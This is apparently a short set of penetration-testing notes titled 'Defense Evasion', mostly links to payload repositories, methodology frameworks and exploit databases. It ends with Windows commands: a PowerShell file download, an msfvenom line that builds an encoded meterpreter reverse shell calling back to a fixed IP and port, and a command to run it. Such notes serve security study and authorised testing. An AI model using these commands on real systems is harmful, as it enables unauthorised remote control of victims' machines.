---
title: "Defense Evasion"
---

<p style="text-align: right">_- last update 02/12/2022 -_</p>

## Some links

Where to find good shell payload depending on the technology:

* [SeclLists](https://github.com/danielmiessler/SecLists)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-	[static-binaries](https://github.com/andrew-d/static-binaries)
-	[CyberChef](https://gchq.github.io/CyberChef/)

Online Methodology frameworks:

-	[OSSTMM](https://duckduckgo.com/?q=osstmm+site%3Aisecom.org&ia=web) (Open Source Security Testing Methodologie Manual)
-	[OWASP](https://owasp.org/) (Open Web Application Security)
-	[NIST](https://www.nist.gov/cyberframework) (National Institute of Standards and Technology)
-	[NCSC CAF](https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance) (National Cyber Security Centre, Cyber Assessment Framework)

Vulnerabily / Exploit databases:

-	[USA (NIST)](https://nvd.nist.gov/vuln/search#)
-	[RAPID7](https://www.rapid7.com/db/)
-	[exploit-db](https://www.exploit-db.com/)

## Windows Useful commands

Pour download un fichier

```bash
powershell -c "Invoke-WebRequest -Uri '...' -Outfile '...'"
```

Pour générer un payload reverse shell :

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.13.134 LPORT=4444 -f exe -o shellexe
```

Pour executer un payload

```bash
powershell -c "Star-Process 'myreverseshell.exe'"
```
